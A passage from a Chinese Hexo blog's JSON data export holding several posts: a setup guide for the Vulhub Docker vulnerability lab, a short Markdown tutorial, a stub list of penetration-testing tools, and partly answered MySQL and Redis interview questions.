data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/漏洞靶场Vulhub使用.md","raw":"---\ntitle: 漏洞靶场Vulhub使用\ndate: 2018-11-01 17:36:18\ntags:\ncategories:\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\nVulhub是一个面向大众的开源漏洞靶场，采用docker进行搭建，但是无需docker知识，简单执行两条命令即可编译、运行一个完整的靶场环境。该项目旨在让漏洞复现变得更加简单，让安全研究人员更专注于漏洞本身。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 安装\n{% endnote %}\n</div>\n\n我在Centos7上进行的如下步骤，如果在其他类型的机器上，可以参照进行各个环境的安装\n\n```bash\n# 安装git\nyum install git\n# 安装docker并启动docker\nyum install docker && systemctl start docker\n# 安装docker-compose\nyum install docker-compose\n```\n\n由于该漏洞环境镜像均来自于Dockerhub/Github/软件官网，所以在国内访问可能会存在速度慢、丢包等问题，导致环境地洞太卡，影响正常使用，请自行解决翻墙问题，或者采用加速器进行加速。\n\ndocker-compose用户组合服务和内网，有的环境涉及到多个容器、端口等，docker-compose可以做到环境的一键化管理，用户不需要再学习各种参数和用法，只需要简单的执行`docker-compose up -d`即可启动容器环境。\n\n安装完上述环境之后，可以通过以下命令来下载vulhub环境到任何目录\n\n```bash\ngit clone https://github.com/vulhub/vulhub.git\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 启动漏洞环境\n{% endnote %}\n</div>\n\ndocker-compose会自动查找当前目录下的配置文件(默认文件名为docker-compose.xml),并根据其内容编译镜像和启动容器。所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。\n\n在vulhub中选择某个环境，进入对应目录。如Flask服务端模板注入漏洞，我们进入`flask/ssti`目录，执行如下命令，进行漏洞靶场的编译和运行：\n```bash\ncd flask/ssti\ndocker-compose build\ndocker-compose up -d\n```\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"漏洞靶场Vulhub使用","published":1,"updated":"2019-06-26T03:52:03.506Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2go0015o25tv5uijtv0","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>Vulhub是一个面向大众的开源漏洞靶场，采用docker进行搭建，但是无需docker知识，简单执行两条命令即可编译、运行一个完整的靶场环境。该项目旨在让漏洞复现变得更加简单，让安全研究人员更专注于漏洞本身。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3></div><br></div>\n\n<p>我在Centos7上进行的如下步骤，如果在其他类型的机器上，可以参照进行各个环境的安装</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装git</span></span><br><span class=\"line\">yum install git</span><br><span class=\"line\"><span class=\"comment\"># 安装docker并启动docker</span></span><br><span class=\"line\">yum install docker &amp;&amp; systemctl start docker</span><br><span class=\"line\"><span class=\"comment\"># 安装docker-compose</span></span><br><span class=\"line\">yum install docker-compose</span><br></pre></td></tr></table></figure>\n<p>由于该漏洞环境镜像均来自于Dockerhub/Github/软件官网，所以在国内访问可能会存在速度慢、丢包等问题，导致环境地洞太卡，影响正常使用，请自行解决翻墙问题，或者采用加速器进行加速。</p>\n<p>docker-compose用户组合服务和内网，有的环境涉及到多个容器、端口等，docker-compose可以做到环境的一键化管理，用户不需要再学习各种参数和用法，只需要简单的执行<code>docker-compose up -d</code>即可启动容器环境。</p>\n<p>安装完上述环境之后，可以通过以下命令来下载vulhub环境到任何目录</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"启动漏洞环境\"><a href=\"#启动漏洞环境\" class=\"headerlink\" title=\"启动漏洞环境\"></a>启动漏洞环境</h3></div><br></div>\n\n<p>docker-compose会自动查找当前目录下的配置文件(默认文件名为docker-compose.xml),并根据其内容编译镜像和启动容器。所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。</p>\n<p>在vulhub中选择某个环境，进入对应目录。如Flask服务端模板注入漏洞，我们进入<code>flask/ssti</code>目录，执行如下命令，进行漏洞靶场的编译和运行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> flask/ssti</span><br><span class=\"line\">docker-compose build</span><br><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>Vulhub是一个面向大众的开源漏洞靶场，采用docker进行搭建，但是无需docker知识，简单执行两条命令即可编译、运行一个完整的靶场环境。该项目旨在让漏洞复现变得更加简单，让安全研究人员更专注于漏洞本身。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3></div><br></div>\n\n<p>我在Centos7上进行的如下步骤，如果在其他类型的机器上，可以参照进行各个环境的安装</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装git</span></span><br><span class=\"line\">yum install git</span><br><span class=\"line\"><span class=\"comment\"># 安装docker并启动docker</span></span><br><span class=\"line\">yum install docker &amp;&amp; systemctl start docker</span><br><span class=\"line\"><span class=\"comment\"># 安装docker-compose</span></span><br><span class=\"line\">yum install docker-compose</span><br></pre></td></tr></table></figure>\n<p>由于该漏洞环境镜像均来自于Dockerhub/Github/软件官网，所以在国内访问可能会存在速度慢、丢包等问题，导致环境地洞太卡，影响正常使用，请自行解决翻墙问题，或者采用加速器进行加速。</p>\n<p>docker-compose用户组合服务和内网，有的环境涉及到多个容器、端口等，docker-compose可以做到环境的一键化管理，用户不需要再学习各种参数和用法，只需要简单的执行<code>docker-compose up -d</code>即可启动容器环境。</p>\n<p>安装完上述环境之后，可以通过以下命令来下载vulhub环境到任何目录</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"启动漏洞环境\"><a href=\"#启动漏洞环境\" class=\"headerlink\" title=\"启动漏洞环境\"></a>启动漏洞环境</h3></div><br></div>\n\n<p>docker-compose会自动查找当前目录下的配置文件(默认文件名为docker-compose.xml),并根据其内容编译镜像和启动容器。所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。</p>\n<p>在vulhub中选择某个环境，进入对应目录。如Flask服务端模板注入漏洞，我们进入<code>flask/ssti</code>目录，执行如下命令，进行漏洞靶场的编译和运行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> flask/ssti</span><br><span class=\"line\">docker-compose build</span><br><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"用Markdown来写文章","date":"2018-09-06T10:39:40.000Z","_content":"\n## Markdown\n\nMarkdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成丰富的HTML页面。\n\nMarkdown用一些简单的符号标识不同的标题，将某些文章标记为\"**粗体**\"或者*斜体*，下面就来一起学习一下。\n\n\n<br>\n## 语法\n\n**1、标题**\n\n不同的标题采用不等个数的`#`号来进行标记，如下所示：\n\n```Markdown\n# 一级标题\n## 二级标题\n### 三级标题\n#### 四级标题\n```\n\n**2、代码块**\n\n在需要高亮的代码块的前一行及后一行使用三个反引号“\\`”，同时第一行反引号后面表面代码块所使用的语言, 如下：\n\n\\`\\`\\`pyhton\nprint (\"Hello World!\")\n\\`\\`\\`\n\n**3、特殊字符**\n\n```markdown\n**粗体**\n*斜体*\n> 引用内容\n```\n\n\n<br>\n<br>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n","source":"_posts/用Markdown来写文章.md","raw":"---\ntitle: 用Markdown来写文章\ndate: 2018-09-06 18:39:40\ntags: ['hexo','博客', 'Markdown']\ncategories: Markdown\n---\n\n## Markdown\n\nMarkdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成丰富的HTML页面。\n\nMarkdown用一些简单的符号标识不同的标题，将某些文章标记为\"**粗体**\"或者*斜体*，下面就来一起学习一下。\n\n\n<br>\n## 语法\n\n**1、标题**\n\n不同的标题采用不等个数的`#`号来进行标记，如下所示：\n\n```Markdown\n# 一级标题\n## 二级标题\n### 三级标题\n#### 四级标题\n```\n\n**2、代码块**\n\n在需要高亮的代码块的前一行及后一行使用三个反引号“\\`”，同时第一行反引号后面表面代码块所使用的语言, 如下：\n\n\\`\\`\\`pyhton\nprint (\"Hello World!\")\n\\`\\`\\`\n\n**3、特殊字符**\n\n```markdown\n**粗体**\n*斜体*\n> 引用内容\n```\n\n\n<br>\n<br>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n","slug":"用Markdown来写文章","published":1,"updated":"2019-06-26T03:52:03.506Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2gq0018o25tja5eem7d","content":"<h2 id=\"Markdown\"><a href=\"#Markdown\" class=\"headerlink\" title=\"Markdown\"></a>Markdown</h2><p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成丰富的HTML页面。</p>\n<p>Markdown用一些简单的符号标识不同的标题，将某些文章标记为”<strong>粗体</strong>“或者<em>斜体</em>，下面就来一起学习一下。</p>\n<p><br></p>\n<h2 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h2><p><strong>1、标题</strong></p>\n<p>不同的标题采用不等个数的<code>#</code>号来进行标记，如下所示：</p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\"># 一级标题</span></span><br><span class=\"line\"><span class=\"section\">## 二级标题</span></span><br><span class=\"line\"><span class=\"section\">### 三级标题</span></span><br><span class=\"line\"><span class=\"section\">#### 四级标题</span></span><br></pre></td></tr></table></figure>\n<p><strong>2、代码块</strong></p>\n<p>在需要高亮的代码块的前一行及后一行使用三个反引号“`”，同时第一行反引号后面表面代码块所使用的语言, 如下：</p>\n<p>```pyhton<br>print (“Hello World!”)<br>```</p>\n<p><strong>3、特殊字符</strong></p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"strong\">**粗体**</span></span><br><span class=\"line\"><span class=\"emphasis\">*斜体*</span></span><br><span class=\"line\"><span class=\"quote\">&gt; 引用内容</span></span><br></pre></td></tr></table></figure>\n<p><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Markdown\"><a href=\"#Markdown\" class=\"headerlink\" title=\"Markdown\"></a>Markdown</h2><p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成丰富的HTML页面。</p>\n<p>Markdown用一些简单的符号标识不同的标题，将某些文章标记为”<strong>粗体</strong>“或者<em>斜体</em>，下面就来一起学习一下。</p>\n<p><br></p>\n<h2 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h2><p><strong>1、标题</strong></p>\n<p>不同的标题采用不等个数的<code>#</code>号来进行标记，如下所示：</p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\"># 一级标题</span></span><br><span class=\"line\"><span class=\"section\">## 二级标题</span></span><br><span class=\"line\"><span class=\"section\">### 三级标题</span></span><br><span class=\"line\"><span class=\"section\">#### 四级标题</span></span><br></pre></td></tr></table></figure>\n<p><strong>2、代码块</strong></p>\n<p>在需要高亮的代码块的前一行及后一行使用三个反引号“`”，同时第一行反引号后面表面代码块所使用的语言, 如下：</p>\n<p>```pyhton<br>print (“Hello World!”)<br>```</p>\n<p><strong>3、特殊字符</strong></p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"strong\">**粗体**</span></span><br><span class=\"line\"><span class=\"emphasis\">*斜体*</span></span><br><span class=\"line\"><span class=\"quote\">&gt; 引用内容</span></span><br></pre></td></tr></table></figure>\n<p><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n"},{"title":"渗透测试不同阶段工具整理","date":"2019-04-22T09:31:42.000Z","_content":"\n### 信息收集\n\n1. DNS信息收集\n* Fierce\n\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/渗透测试不同阶段工具整理.md","raw":"---\ntitle: 渗透测试不同阶段工具整理\ndate: 2019-04-22 17:31:42\ntags: ['二叉树','算法']\ncategories: 安全\n---\n\n### 信息收集\n\n1. DNS信息收集\n* Fierce\n\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"渗透测试不同阶段工具整理","published":1,"updated":"2019-07-30T10:17:16.759Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2gr0019o25tdh0ssl88","content":"<h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><ol>\n<li>DNS信息收集</li>\n</ol>\n<ul>\n<li>Fierce</li>\n</ul>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><ol>\n<li>DNS信息收集</li>\n</ol>\n<ul>\n<li>Fierce</li>\n</ul>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"数据库面试题","date":"2018-11-02T03:19:47.000Z","_content":"\n#### 1、SQL优化的常见方法\n\n#### 2、SQL索引的顺序、字段的顺序\n\n#### 3、查看SQL索引\n\n#### 4、Mysql分页查询语句\n\n\n#### 5、Mysql的事物特性和隔离级别\n- 事务特性(ACID)\n\t- 原子性(Atomicity):一个事务必须视为一个不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚。\n\t- 一致性(Consistency):数据库总是从一个一致性的状态转移到另一个一致性的状态\n\t- 隔离性(Isolation)：一个事务所做的修改在最终提交前，对其他事务是不可见的。\n\t- 持久性(Durability)：一旦事务提交，其所做的修改就会永久的保存在数据库中\n- 隔离级别：\n\t- 读未提交(read-uncommited)：一个事务读取另一个事务未提交的数据，可能会出现脏读\n\t- 读已提交(read-commited)：一个事务要等到另一个事务提交后才能读取数据，可能会出现不可重复读\n\t- 可重复读(repeatable-read)：开始读取数据的事务开始后，不在允许修改动作，可能会出现幻读\n\t- 序列化读(Serializble)：串行化顺序执行\n\t大多数数据库默认的隔离级别是read commited如sql server、oracle，Mysql的默认级别是repeatable-read。\n\n#### 6、sql having的使用场景\n\n#### 7、Mysql数据库的索引及原理\n\n#### 8、锁机制介绍：行锁、表锁、排它锁、共享锁\n\n#### 9、乐观锁的业务场景和实现方式\n\n#### 10、事务介绍、分布式事务的理解，常见的解决方案有哪些？ 什么是两阶段提交、三阶段提交\n\n#### 11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么\n\n#### 12、JDBC如何实现事务、嵌套事务实现、分布式事务实现\n\n#### 13、SQL的整个解析过程、执行过程原理、SQL行转列\n\n#### 14、Redis为什么这么快，Redis采用多线程会有那些问题\n\n#### 15、Redis支持那些数据结构\nString 字符串、List 列表、Set 集合、Hash 哈希、Zset有序集合\n\n#### 16、Redsi跳表的问题\n\n#### 17、Redsi单进程单线程如何能够高并发\n\n#### 18、如何使用Redis实现分布式锁\n\n#### 19、Redis分布式锁操作的原子性，Redsi内部是如何实现的\n\n#### 20、为什么用自增列作为主键\n\n1. \n\n#### 21、MySQL的索引都有哪些\n\nMySQL的索引分为单列索引（普通索引、唯一索引、主键索引）和组合索引。\n\n(1) 普通索引\n\n最基本的索引，没有任何限制\n\n(2) 唯一索引\n\n它与普通索引类似，不同的是索引列的值必须是唯一的，但允许有空值；如果是组合索引，则列值的组合必须唯一。\n\n(3) 主键索引\n\n它是一种特殊的唯一索引，不允许有空值，一般是在建表的时候创建主键索引\n\n(4) 组合索引\n\n多个列组成一个索引，专门用于组合搜索\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/数据库面试题.md","raw":"---\ntitle: 数据库面试题\ndate: 2018-11-02 11:19:47\ntags:\ncategories:\n---\n\n#### 1、SQL优化的常见方法\n\n#### 2、SQL索引的顺序、字段的顺序\n\n#### 3、查看SQL索引\n\n#### 4、Mysql分页查询语句\n\n\n#### 5、Mysql的事物特性和隔离级别\n- 事务特性(ACID)\n\t- 原子性(Atomicity):一个事务必须视为一个不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚。\n\t- 一致性(Consistency):数据库总是从一个一致性的状态转移到另一个一致性的状态\n\t- 隔离性(Isolation)：一个事务所做的修改在最终提交前，对其他事务是不可见的。\n\t- 持久性(Durability)：一旦事务提交，其所做的修改就会永久的保存在数据库中\n- 隔离级别：\n\t- 读未提交(read-uncommited)：一个事务读取另一个事务未提交的数据，可能会出现脏读\n\t- 读已提交(read-commited)：一个事务要等到另一个事务提交后才能读取数据，可能会出现不可重复读\n\t- 可重复读(repeatable-read)：开始读取数据的事务开始后，不在允许修改动作，可能会出现幻读\n\t- 序列化读(Serializble)：串行化顺序执行\n\t大多数数据库默认的隔离级别是read commited如sql server、oracle，Mysql的默认级别是repeatable-read。\n\n#### 6、sql having的使用场景\n\n#### 7、Mysql数据库的索引及原理\n\n#### 8、锁机制介绍：行锁、表锁、排它锁、共享锁\n\n#### 9、乐观锁的业务场景和实现方式\n\n#### 10、事务介绍、分布式事务的理解，常见的解决方案有哪些？ 什么是两阶段提交、三阶段提交\n\n#### 11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么\n\n#### 12、JDBC如何实现事务、嵌套事务实现、分布式事务实现\n\n#### 13、SQL的整个解析过程、执行过程原理、SQL行转列\n\n#### 14、Redis为什么这么快，Redis采用多线程会有那些问题\n\n#### 15、Redis支持那些数据结构\nString 字符串、List 列表、Set 集合、Hash 哈希、Zset有序集合\n\n#### 16、Redsi跳表的问题\n\n#### 17、Redsi单进程单线程如何能够高并发\n\n#### 18、如何使用Redis实现分布式锁\n\n#### 19、Redis分布式锁操作的原子性，Redsi内部是如何实现的\n\n#### 20、为什么用自增列作为主键\n\n1. \n\n#### 21、MySQL的索引都有哪些\n\nMySQL的索引分为单列索引（普通索引、唯一索引、主键索引）和组合索引。\n\n(1) 普通索引\n\n最基本的索引，没有任何限制\n\n(2) 唯一索引\n\n它与普通索引类似，不同的是索引列的值必须是唯一的，但允许有空值；如果是组合索引，则列值的组合必须唯一。\n\n(3) 主键索引\n\n它是一种特殊的唯一索引，不允许有空值，一般是在建表的时候创建主键索引\n\n(4) 组合索引\n\n多个列组成一个索引，专门用于组合搜索\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"数据库面试题","published":1,"updated":"2019-07-01T01:56:08.866Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2gs001co25t09y7k8w8","content":"<h4 id=\"1、SQL优化的常见方法\"><a href=\"#1、SQL优化的常见方法\" class=\"headerlink\" title=\"1、SQL优化的常见方法\"></a>1、SQL优化的常见方法</h4><h4 id=\"2、SQL索引的顺序、字段的顺序\"><a href=\"#2、SQL索引的顺序、字段的顺序\" class=\"headerlink\" title=\"2、SQL索引的顺序、字段的顺序\"></a>2、SQL索引的顺序、字段的顺序</h4><h4 id=\"3、查看SQL索引\"><a href=\"#3、查看SQL索引\" class=\"headerlink\" title=\"3、查看SQL索引\"></a>3、查看SQL索引</h4><h4 id=\"4、Mysql分页查询语句\"><a href=\"#4、Mysql分页查询语句\" class=\"headerlink\" title=\"4、Mysql分页查询语句\"></a>4、Mysql分页查询语句</h4><h4 id=\"5、Mysql的事物特性和隔离级别\"><a href=\"#5、Mysql的事物特性和隔离级别\" class=\"headerlink\" title=\"5、Mysql的事物特性和隔离级别\"></a>5、Mysql的事物特性和隔离级别</h4><ul>\n<li>事务特性(ACID)<ul>\n<li>原子性(Atomicity):一个事务必须视为一个不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚。</li>\n<li>一致性(Consistency):数据库总是从一个一致性的状态转移到另一个一致性的状态</li>\n<li>隔离性(Isolation)：一个事务所做的修改在最终提交前，对其他事务是不可见的。</li>\n<li>持久性(Durability)：一旦事务提交，其所做的修改就会永久的保存在数据库中</li>\n</ul>\n</li>\n<li>隔离级别：<ul>\n<li>读未提交(read-uncommited)：一个事务读取另一个事务未提交的数据，可能会出现脏读</li>\n<li>读已提交(read-commited)：一个事务要等到另一个事务提交后才能读取数据，可能会出现不可重复读</li>\n<li>可重复读(repeatable-read)：开始读取数据的事务开始后，不在允许修改动作，可能会出现幻读</li>\n<li>序列化读(Serializble)：串行化顺序执行<br>大多数数据库默认的隔离级别是read commited如sql server、oracle，Mysql的默认级别是repeatable-read。</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"6、sql-having的使用场景\"><a href=\"#6、sql-having的使用场景\" class=\"headerlink\" title=\"6、sql having的使用场景\"></a>6、sql having的使用场景</h4><h4 id=\"7、Mysql数据库的索引及原理\"><a href=\"#7、Mysql数据库的索引及原理\" class=\"headerlink\" title=\"7、Mysql数据库的索引及原理\"></a>7、Mysql数据库的索引及原理</h4><h4 id=\"8、锁机制介绍：行锁、表锁、排它锁、共享锁\"><a href=\"#8、锁机制介绍：行锁、表锁、排它锁、共享锁\" class=\"headerlink\" title=\"8、锁机制介绍：行锁、表锁、排它锁、共享锁\"></a>8、锁机制介绍：行锁、表锁、排它锁、共享锁</h4><h4 id=\"9、乐观锁的业务场景和实现方式\"><a href=\"#9、乐观锁的业务场景和实现方式\" class=\"headerlink\" title=\"9、乐观锁的业务场景和实现方式\"></a>9、乐观锁的业务场景和实现方式</h4><h4 id=\"10、事务介绍、分布式事务的理解，常见的解决方案有哪些？-什么是两阶段提交、三阶段提交\"><a href=\"#10、事务介绍、分布式事务的理解，常见的解决方案有哪些？-什么是两阶段提交、三阶段提交\" class=\"headerlink\" title=\"10、事务介绍、分布式事务的理解，常见的解决方案有哪些？ 什么是两阶段提交、三阶段提交\"></a>10、事务介绍、分布式事务的理解，常见的解决方案有哪些？ 什么是两阶段提交、三阶段提交</h4><h4 id=\"11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么\"><a href=\"#11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么\" class=\"headerlink\" title=\"11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么\"></a>11、Mysql记录binglog的方式主要包括三种模式，每种模式的优缺点是什么</h4><h4 id=\"12、JDBC如何实现事务、嵌套事务实现、分布式事务实现\"><a href=\"#12、JDBC如何实现事务、嵌套事务实现、分布式事务实现\" class=\"headerlink\" title=\"12、JDBC如何实现事务、嵌套事务实现、分布式事务实现\"></a>12、JDBC如何实现事务、嵌套事务实现、分布式事务实现</h4><h4 id=\"13、SQL的整个解析过程、执行过程原理、SQL行转列\"><a 